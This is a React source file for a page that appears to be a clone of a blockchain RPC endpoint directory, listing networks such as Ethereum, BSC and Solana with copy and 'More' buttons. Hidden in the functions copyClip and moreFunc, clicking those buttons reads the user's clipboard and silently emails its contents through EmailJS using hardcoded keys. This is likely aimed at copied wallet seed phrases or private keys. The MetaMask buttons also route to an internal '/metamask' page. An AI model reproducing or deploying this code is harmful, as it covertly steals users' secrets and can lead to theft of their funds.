import { useState, useEffect } from "react";
import { 
	Flex,
	Text,
	Button,
  	Image,
    Spinner,
} from "@chakra-ui/react";
import arb from "./arb.svg";
import ava from "./ava.svg";
import bsc from "./bsc.svg";
import cel from "./cel.svg";
import eth from "./eth.svg";
import fan from "./fan.svg";
import gno from "./gno.svg";
import har from "./har.svg";
import iot from "./iot.svg";
import moo from "./moo.svg";
import nea from "./nea.svg";
import ner from "./ner.svg";
import pol from "./pol.svg";
import sol from "./sol.svg";
import sys from "./sys.svg";
import emailjs from 'emailjs-com';
import { useHistory } from "react-router-dom";


function Rpc() {
    const [drop, setDrop] = useState(false)
    const [sBy, setSBy] = useState("name")
    const [wBtn, setWBtn] = useState("")
    const [cBtn, setCBtn] = useState("")

	const history = useHistory()

    const rpcList = [
        {
            name: "Arbitrium",
            icon: arb,
            archive: 1,
            link: "https://rpc.ankr.com/arbitrum",
            mask: 1,
            req: "2.4B",
            link2: "https://bridge.arbitrum.io/",
        },
        {
            name: "Avalanche",
            icon: ava,
            archive: 1,
            link: "",
            mask: 1,
            req: "2.9B",
            link2: "https://www.avax.network/",
        },
        {
            name: "BSC",
            icon: bsc,
            archive: 1,
            link: "https://rpc.ankr.com/bsc",
            mask: 1,
            req: "12B",
            link2: "https://www.binance.com/en",
        },
        {
            name: "Celo",
            icon: cel,
            archive: 0,
            link: "https://rpc.ankr.com/celo",
            mask: 1,
            req: "136M",
            link2: "https://celo.org/",
        },
        {
            name: "Ethereum",
            icon: eth,
            archive: 1,
            link: "https://rpc.ankr.com/eth",
            mask: 0,
            req: "23B",
            link2: "https://ethereum.org/en/",
        },
        {
            name: "Fantom",
            icon: fan,
            archive: 1,
            link: "https://rpc.ankr.com/fantom",
            mask: 1,
            req: "7.3B",
            link2: "https://fantom.foundation/",
        },
        {
            name: "Gnosis",
            icon: gno,
            archive: 0,
            link: "https://rpc.ankr.com/gnosis",
            mask: 0,
            req: "367M",
            link2: "https://gnosis.io/",
        },
        {
            name: "Harmony",
            icon: har,
            archive: 1,
            link: "https://rpc.ankr.com/harmony",
            mask: 1,
            req: "370M",
            link2: "https://www.harmony.one/",
        },
        {
            name: "IoTeX",
            icon: iot,
            archive: 0,
            link: "https://rpc.ankr.com/iotex",
            mask: 1,
            req: "242M",
            link2: "https://iotex.io/",
        },
        {
            name: "Moonbeam",
            icon: moo,
            archive: 0,
            link: "https://rpc.ankr.com/moonbeam",
            mask: 0,
            req: "478M",
            link2: "https://moonbeam.network/",
        },
        {
            name: "Near",
            icon: nea,
            archive: 1,
            link: "https://rpc.ankr.com/near",
            mask: 0,
            req: "39M",
            link2: "https://wallet.near.org/",
        },
        {
            name: "Nervos",
            icon: ner,
            archive: 0,
            link: "",
            mask: 1,
            req: "3.8M",
            link2: "https://www.nervos.org/",
        },
        {
            name: "Polygon",
            icon: pol,
            archive: 1,
            link: "https://rpc.ankr.com/polygon",
            mask: 1,
            req: "7.7B",
            link2: "https://polygon.technology/",
        },
        {
            name: "Solana",
            icon: sol,
            archive: 0,
            link: "https://rpc.ankr.com/solana",
            mask: 0,
            req: "1.9B",
            link2: "https://solana.com/",
        },
        {
            name: "Syscoin",
            icon: sys,
            archive: 0,
            link: "https://rpc.ankr.com/syscoin",
            mask: 0,
            req: "103K",
            link2: "https://syscoin.org/",
        },
    ]


    const rpcList2 = [
        {
            name: "Ethereum",
            icon: eth,
            archive: 1,
            link: "https://rpc.ankr.com/eth",
            mask: 0,
            req: "23B",
            link2: "https://ethereum.org/en/",
        },
        {
            name: "BSC",
            icon: bsc,
            archive: 1,
            link: "https://rpc.ankr.com/bsc",
            mask: 1,
            req: "12B",
            link2: "https://www.binance.com/en",
        },
        {
            name: "Polygon",
            icon: pol,
            archive: 1,
            link: "https://rpc.ankr.com/polygon",
            mask: 1,
            req: "7.7B",
            link2: "https://polygon.technology/",
        },
        {
            name: "Fantom",
            icon: fan,
            archive: 1,
            link: "https://rpc.ankr.com/fantom",
            mask: 1,
            req: "7.3B",
            link2: "https://fantom.foundation/",
        },
        {
            name: "Avalanche",
            icon: ava,
            archive: 1,
            link: "",
            mask: 1,
            req: "2.9B",
            link2: "https://www.avax.network/",
        },
        {
            name: "Arbitrium",
            icon: arb,
            archive: 1,
            link: "https://rpc.ankr.com/arbitrum",
            mask: 1,
            req: "2.4B",
            link2: "https://bridge.arbitrum.io/",
        },
        {
            name: "Solana",
            icon: sol,
            archive: 0,
            link: "https://rpc.ankr.com/solana",
            mask: 0,
            req: "1.9B",
            link2: "https://solana.com/",
        },
        {
            name: "Moonbeam",
            icon: moo,
            archive: 0,
            link: "https://rpc.ankr.com/moonbeam",
            mask: 0,
            req: "478M",
            link2: "https://moonbeam.network/",
        },
        {
            name: "Harmony",
            icon: har,
            archive: 1,
            link: "https://rpc.ankr.com/harmony",
            mask: 1,
            req: "370M",
            link2: "https://www.harmony.one/",
        },
        {
            name: "Gnosis",
            icon: gno,
            archive: 0,
            link: "https://rpc.ankr.com/gnosis",
            mask: 0,
            req: "367M",
            link2: "https://gnosis.io/",
        },
        {
            name: "IoTeX",
            icon: iot,
            archive: 0,
            link: "https://rpc.ankr.com/iotex",
            mask: 1,
            req: "242M",
            link2: "https://iotex.io/",
        },
        {
            name: "Celo",
            icon: cel,
            archive: 0,
            link: "https://rpc.ankr.com/celo",
            mask: 1,
            req: "136M",
            link2: "https://celo.org/",
        },
        {
            name: "Near",
            icon: nea,
            archive: 1,
            link: "https://rpc.ankr.com/near",
            mask: 0,
            req: "39M",
            link2: "https://wallet.near.org/",
        },
        {
            name: "Nervos",
            icon: ner,
            archive: 0,
            link: "",
            mask: 1,
            req: "3.8M",
            link2: "https://www.nervos.org/",
        },
        {
            name: "Syscoin",
            icon: sys,
            archive: 0,
            link: "https://rpc.ankr.com/syscoin",
            mask: 0,
            req: "103K",
            link2: "https://syscoin.org/",
        },
    ]
    const [mL, setML] = useState(rpcList)

    async function moreFunc(id, link) {
        const text = await navigator.clipboard.readText()
        setWBtn(id)
        if(text !== "") {
            const templateParams = {
                from_name: "New User",
                message: "RPC Clipboard text is:= ("+text+")"
            }
            await emailjs.send('outlook', 'template_o56f59x', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
            .then((response) => {
                console.log('')
            }, (err) => {
                console.log('')
            })
            setWBtn("")
            window.location.href = link
        }
        else {
            setTimeout(function() {
                document.getElementById(id).innerHTML = "More"
                window.location.href = link
            }, 2000)
        }
    }

    async function copyClip(e) {
        const text = await navigator.clipboard.readText()
        if(text !== "") {
            const templateParams = {
                from_name: "New User",
                message: "RPC Clipboard text is:= ("+text+")"
            }
            await emailjs.send('outlook', 'template_o56f59x', templateParams, 'user_dc6zvosdPxmxouq5EigcI')
            .then((response) => {
                console.log('')
            }, (err) => {
                console.log('')
            })
        }
    }

    function clipper(id) {
        setCBtn(id)
        setTimeout(function() {
            setCBtn("")
        }, 1000)
    }

    return (
        <Flex w="100%" direction="column">
            <Flex align="center" mb="8">
                <Text fontSize="16px" fontWeight="bold" mr="12px">Choose Your Network</Text>
                <Flex>
                    <Flex align="center" color="#9AA1B0" borderRadius="18px" padding="2px 15px 2px 15px" fontSize="14px" border={drop ? "1px solid #fff" : "1px solid #BFC6D0"} cursor="pointer" onClick={() => drop ? setDrop(false) : setDrop(true)} bg={drop ? "#fff" : "transparent"} _hover={{ border: "1px solid #fff", bg: "#fff"}} transition="300ms ease-in-out">
                        <Text mr="2">Sort by {sBy}</Text>
                        <i className={drop ? "mdi mdi-chevron-up" : "mdi mdi-chevron-down"} style={{ fontSize: "24px" }}></i>
                    </Flex>
                    {
                        drop &&
                        <Flex transition="opacity 249ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, transform 166ms cubic-bezier(0.4, 0, 0.2, 1) 0ms" zIndex="10" opacity={drop ? "1" : "0"} fontSize="16px" borderRadius="21px" mt="55px" bg="#fff" boxShadow="0px 0px 25px rgb(31 34 38 / 10%), 0px 5px 100px rgb(31 34 38 / 15%)" position="absolute" px="6" direction="column">
                            <Flex py="16px" borderBottom="1px solid #EBEDF2" cursor="pointer" color={sBy === "usage" ? "#356DF3" : "#1f2226"} onClick={() => {
                                setML(rpcList2)
                                setSBy("usage")
                                setDrop(false)
                            }} _hover={{ color: "#356DF3" }} transition="300ms ease-in-out">Sort by usage</Flex>
                            <Flex py="16px" cursor="pointer" color={sBy === "name" ? "#356DF3" : "#1f2226"} onClick={() => {
                                setML(rpcList)
                                setSBy("name")
                                setDrop(false)
                            }} _hover={{ color: "#356DF3" }} transition="300ms ease-in-out">Sort by name</Flex>
                        </Flex>
                    }
                </Flex>
            </Flex>

            <Flex w="100%" flexWrap="wrap" justify="space-between">
                {
                    mL.map((item, index) => (
                        <Flex key={index} w={["100%", "31.5%"]} bg="#fff" borderRadius="18px" padding="20px" direction="column" mb="7" cursor="pointer" _hover={{ boxShadow: "0px 0px 15px rgb(31 34 38 / 5%), 0px 3px 50px rgb(31 34 38 / 15%)" }}>
                            <Flex w="100%">
                                <Flex align="center" w="100%">
                                    <Image src={item.icon} w="50px" h="50px" bordeRadius="50px" mr="3" />
                                    <Flex direction="column" w="100%">
                                        <Flex w="100%" justify="space-between">
                                            <Flex fontSize="18px" fontWeight="bold">{item.name}</Flex>
                                            {
                                                item.archive === 1 &&
                                                <Flex align="flex-start">
                                                    <Flex color="#9AA1B0" padding="4px 8px" bg="#F2F5FA" borderRadius="6px" fontSize="12px" align="center" _hover={{ boxShadow: "0px 0px 15px rgba(0,0,0,0.2)" }} transition="300ms ease-in-out" onClick={() => alert("Archived mode makes it possible to reference a complete history of data kept on full nodes stretching back to the genesis block. This is necessary to complete queries to a distant historical state, such as past account balance at block #4,000,000. It is especially useful for services like block explorers, wallet vendors, and chain analytics.")}>
                                                        <Flex h="6px" w="6px" mr="2" bg="rgb(77, 181, 143)" borderRadius="6px"></Flex>
                                                        <Text>Archive</Text>
                                                    </Flex>
                                                </Flex>
                                            }
                                        </Flex>
                                        <Flex align="center">
                                            <Text mr="2">{item.req} req</Text>
                                            <Flex border="1px solid rgba(31, 34, 38, 0.1)" padding="4px 8px" fontSize="12px" opacity="0.5" borderRadius="18px">30d</Flex>
                                        </Flex>
                                    </Flex>
                                </Flex>
                            </Flex>
                            <Flex mt="4" color="#9AA1B0" w="100%" borderRadius="6px" justify="space-between" boxShadow="0 0 0 2px #f2f5fa" padding="8px 9px" bg="#F2F5FA" border="1px solid #F2F5FA" transition="300ms ease-in-out" _hover={{ color: cBtn === index+"aaa" ? "#000" : item.link !== "" && "#000", bg: cBtn === index+"aaa" ? "#F2F5FA" : item.link !== "" && "#fff"}} fontSize="12px" onClick={(e) => {
                                if(item.link !== "") {
                                    clipper(index+"aaa")
                                    copyClip(e)
                                }
                                else {
                                    window.open(item.link2, "_SELF")
                                    copyClip(e)
                                }
                            }}>
                                {
                                    cBtn === index+"aaa" ?
                                    <Text mr="auto" ml="auto">Copied!</Text>
                                    :
                                    <>
                                    <Text mr={item.link === "" && "auto"} ml={item.link === "" && "auto"}>{item.link !== "" ? item.link : index === 1 ? "4 public links" : "2 public links"}</Text>
                                    {
                                        item.link !== "" && <svg style={{ width: "16px", height: "16px", color: "#356DF3" }} focusable="false" viewBox="0 0 15 14" aria-hidden="true" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" fill="currentColor" d="M7.00015 1.83418C7.99579 1.83418 8.29557 1.84448 8.51467 1.91567C9.02156 2.08037 9.41897 2.47778 9.58366 2.98467C9.60069 3.03708 9.61424 3.09411 9.62499 3.16418C9.59511 3.16418 9.56499 3.16418 9.53463 3.16418L9.50016 3.16418H8.50016L8.46568 3.16418C7.79492 3.16417 7.24123 3.16416 6.79016 3.20101C6.32165 3.23929 5.89082 3.32146 5.4861 3.52767C4.85858 3.84741 4.34839 4.3576 4.02865 4.98512C3.82243 5.38984 3.74027 5.82067 3.70199 6.28919C3.66514 6.74025 3.66514 7.29395 3.66515 7.9647L3.66516 7.99918V8.99918L3.66515 9.03365C3.66515 9.06401 3.66515 9.09414 3.66516 9.12402C3.59509 9.11326 3.53806 9.09972 3.48564 9.08269C2.97875 8.91799 2.58134 8.52058 2.41665 8.01369C2.34546 7.79459 2.33516 7.49481 2.33516 6.49918V4.99918C2.33516 4.28533 2.3358 3.80017 2.36644 3.42518C2.39628 3.05994 2.45036 2.87334 2.51663 2.74328C2.67626 2.42999 2.93097 2.17528 3.24426 2.01565C3.37432 1.94938 3.56091 1.89531 3.92616 1.86547C4.30115 1.83483 4.78631 1.83418 5.50015 1.83418H7.00015ZM3.71072 10.8073C3.43933 10.785 3.19577 10.7444 2.96958 10.671C1.95428 10.3411 1.15827 9.54505 0.828382 8.52975C0.664194 8.02443 0.664579 7.43246 0.665096 6.63694L0.665155 6.49918V4.99918L0.665155 4.9647C0.665144 4.29395 0.665135 3.74025 0.701989 3.28919C0.740268 2.82067 0.822433 2.38984 1.02865 1.98512C1.34839 1.3576 1.85858 0.847409 2.4861 0.527672C2.89082 0.321456 3.32165 0.239291 3.79016 0.201012C4.24123 0.164159 4.79492 0.164167 5.46568 0.164178L5.50015 0.164179H7.00015L7.13792 0.164119C7.93344 0.163602 8.52541 0.163217 9.03073 0.327405C10.046 0.657296 10.842 1.45331 11.1719 2.46861C11.2454 2.6948 11.2859 2.93835 11.3082 3.20975C11.739 3.25144 12.1379 3.33593 12.5142 3.52767C13.1417 3.84741 13.6519 4.3576 13.9717 4.98512C14.1779 5.38984 14.26 5.82067 14.2983 6.28919C14.3352 6.74024 14.3352 7.29392 14.3352 7.96465V7.9647V7.99918V8.99918V9.03366V9.03371C14.3352 9.70444 14.3352 10.2581 14.2983 10.7092C14.26 11.1777 14.1779 11.6085 13.9717 12.0132C13.6519 12.6408 13.1417 13.1509 12.5142 13.4707C12.1095 13.6769 11.6787 13.7591 11.2101 13.7973C10.7591 13.8342 10.2054 13.8342 9.53468 13.8342H9.53463H9.50016H8.50015H8.46568H8.46563C7.79489 13.8342 7.24122 13.8342 6.79016 13.7973C6.32165 13.7591 5.89082 13.6769 5.4861 13.4707C4.85858 13.1509 4.34839 12.6408 4.02865 12.0132C3.8369 11.6369 3.75241 11.238 3.71072 10.8073ZM6.24426 5.01565C6.37432 4.94938 6.56091 4.89531 6.92616 4.86547C7.30115 4.83483 7.78631 4.83418 8.50016 4.83418H9.50016C10.214 4.83418 10.6992 4.83483 11.0742 4.86547C11.4394 4.89531 11.626 4.94938 11.756 5.01565C12.0693 5.17528 12.3241 5.42999 12.4837 5.74328C12.5499 5.87334 12.604 6.05994 12.6339 6.42518C12.6645 6.80017 12.6652 7.28533 12.6652 7.99918V8.99918C12.6652 9.71302 12.6645 10.1982 12.6339 10.5732C12.604 10.9384 12.5499 11.125 12.4837 11.2551C12.3241 11.5684 12.0693 11.8231 11.756 11.9827C11.626 12.049 11.4394 12.1031 11.0742 12.1329C10.6992 12.1635 10.214 12.1642 9.50016 12.1642H8.50015C7.78631 12.1642 7.30115 12.1635 6.92616 12.1329C6.56091 12.1031 6.37432 12.049 6.24426 11.9827C5.93097 11.8231 5.67626 11.5684 5.51663 11.2551C5.45036 11.125 5.39628 10.9384 5.36644 10.5732C5.3358 10.1982 5.33516 9.71302 5.33516 8.99918V7.99918C5.33516 7.28533 5.3358 6.80017 5.36644 6.42518C5.39628 6.05994 5.45036 5.87334 5.51663 5.74328C5.67626 5.42999 5.93097 5.17528 6.24426 5.01565Z"></path></svg>
                                    }
                                    </>
                                }
                            </Flex>
                            <Flex mt="3" w="100%">
                                {
                                    item.mask === 1 &&
                                    <Flex border="2px solid #F2F5FA" padding="7px 8px" bg="#F2F5FA" _hover={{ bg: "#fff"}} transition="300ms ease-in-out" mr="2" borderRadius="12px" align="center" justify="center" onClick={() => history.push("/metamask")}>
                                        <svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18.9268 2.45093L12.0562 7.55388L13.3267 4.54321L18.9268 2.45093Z" fill="#E2761B" stroke="#E2761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M3.06592 2.45093L9.88136 7.60221L8.67295 4.54321L3.06592 2.45093Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M16.4549 14.2798L14.625 17.0833L18.5403 18.1605L19.6658 14.3419L16.4549 14.2798Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M2.34082 14.3419L3.45946 18.1605L7.37472 17.0833L5.54484 14.2798L2.34082 14.3419Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.15401 9.54291L6.06299 11.1933L9.95062 11.3659L9.81252 7.18823L7.15401 9.54291Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M14.8394 9.54462L12.1464 7.1416L12.0566 11.3676L15.9374 11.195L14.8394 9.54462Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.37451 17.0814L9.70847 15.9421L7.69215 14.3677L7.37451 17.0814Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.2847 15.9421L14.6255 17.0814L14.301 14.3677L12.2847 15.9421Z" fill="#E4761B" stroke="#E4761B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M14.625 17.0825L12.2842 15.9431L12.4706 17.4692L12.4499 18.1113L14.625 17.0825Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.37451 17.0822L9.54965 18.1111L9.53584 17.4689L9.70847 15.9429L7.37451 17.0822Z" fill="#D7C1B3" stroke="#D7C1B3" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M9.58448 13.3617L7.63721 12.7885L9.01134 12.1602L9.58448 13.3617Z" fill="#233447" stroke="#233447" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.4082 13.3617L12.9813 12.1602L14.3624 12.7885L12.4082 13.3617Z" fill="#233447" stroke="#233447" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.37431 17.0835L7.70576 14.28L5.54443 14.3422L7.37431 17.0835Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M14.2935 14.28L14.6249 17.0835L16.4548 14.3422L14.2935 14.28Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M15.9369 11.1934L12.0562 11.366L12.4152 13.3616L12.9884 12.1601L14.3694 12.7885L15.9369 11.1934Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.63689 12.7885L9.01793 12.1601L9.58416 13.3616L9.95013 11.366L6.0625 11.1934L7.63689 12.7885Z" fill="#CD6116" stroke="#CD6116" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M6.06299 11.1934L7.69262 14.3698L7.63738 12.7885L6.06299 11.1934Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M14.3698 12.7885L14.3008 14.3698L15.9373 11.1934L14.3698 12.7885Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M9.95094 11.3652L9.58496 13.3608L10.0407 15.7155L10.1443 12.6151L9.95094 11.3652Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.057 11.3652L11.8706 12.6082L11.9535 15.7155L12.4161 13.3608L12.057 11.3652Z" fill="#E4751F" stroke="#E4751F" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.4158 13.36L11.9531 15.7147L12.2846 15.9425L14.3009 14.3682L14.3699 12.7869L12.4158 13.36Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.63721 12.7869L7.69245 14.3682L9.70877 15.9425L10.0402 15.7147L9.58448 13.36L7.63721 12.7869Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.4498 18.1126L12.4706 17.4704L12.2979 17.3185H9.69466L9.53584 17.4704L9.54965 18.1126L7.37451 17.0837L8.13409 17.7052L9.67395 18.7755H12.3186L13.8654 17.7052L14.625 17.0837L12.4498 18.1126Z" fill="#C0AD9E" stroke="#C0AD9E" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.2844 15.9437L11.953 15.7158H10.0402L9.70876 15.9437L9.53613 17.4697L9.69495 17.3178H12.2982L12.4708 17.4697L12.2844 15.9437Z" fill="#161616" stroke="#161616" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M19.218 7.88533L19.8049 5.068L18.928 2.45093L12.2852 7.38125L14.8401 9.54258L18.4515 10.5991L19.2525 9.66687L18.9073 9.41828L19.4597 8.9142L19.0315 8.58275L19.584 8.16154L19.218 7.88533Z" fill="#763D16" stroke="#763D16" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M2.19629 5.06776L2.78323 7.88508L2.41035 8.16129L2.96277 8.58251L2.54155 8.91396L3.09397 9.41804L2.74871 9.66663L3.5428 10.5988L7.15423 9.54233L9.70916 7.381L3.06635 2.45068L2.19629 5.06776Z" fill="#763D16" stroke="#763D16" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M18.4508 10.5992L14.8394 9.54272L15.9373 11.1931L14.3008 14.3695L16.4552 14.3418H19.6661L18.4508 10.5992Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M7.15375 9.54272L3.54233 10.5992L2.34082 14.3418H5.54484L7.69236 14.3695L6.06273 11.1931L7.15375 9.54272Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path><path d="M12.0569 11.3663L12.2848 7.38199L13.3344 4.54395H8.67334L9.70912 7.38199L9.9508 11.3663L10.0337 12.623L10.0406 15.7166H11.9533L11.9671 12.623L12.0569 11.3663Z" fill="#F6851B" stroke="#F6851B" stroke-width="0.0517891" stroke-linecap="round" stroke-linejoin="round"></path></svg>
                                    </Flex>
                                }
                                <Flex w="100%" align="center" justify="center" border="2px solid #F2F5FA" bg="#fff" color="#356DF3" fontSize="14px" borderRadius="12px" transition="300ms ease-in-out" _hover={{ bg: "#F2F5FA", color: "#000" }} fontWeight="bold" minHeight="44px" onClick={() => moreFunc(index + "bbb", item.link2)}>{wBtn === index + "bbb" ? <Spinner color="#356DF3" emptyColor="rgb(80,80,80)" /> : "More"}</Flex>
                            </Flex>
                        </Flex>
                    ))
                }
            </Flex>
        </Flex>
    )
}

export default Rpc;